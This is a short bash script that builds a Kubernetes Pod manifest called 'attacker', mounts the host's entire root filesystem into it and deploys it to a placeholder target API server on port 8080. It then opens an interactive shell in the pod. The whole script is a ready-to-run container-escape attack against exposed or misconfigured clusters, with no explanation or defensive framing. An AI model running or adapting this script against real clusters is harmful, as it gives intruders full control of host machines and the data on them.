#!/bin/bash

cat << EOF > escape.yaml
# attacker.yaml
apiVersion: v1
kind: Pod
metadata:
  name: attacker
spec:
  containers:
  - name: ubuntu
    image: ubuntu:latest
    imagePullPolicy: IfNotPresent
    # Just spin & wait forever
    command: [ "/bin/bash", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
    volumeMounts:
    - name: escape-host
      mountPath: /host-escape-door
  volumes:
    - name: escape-host
      hostPath:
        path: /
EOF

kubectl -s TARGET-IP:8080 apply -f escape.yaml
sleep 8
kubectl -s TARGET-IP:8080 exec -it attacker /bin/bash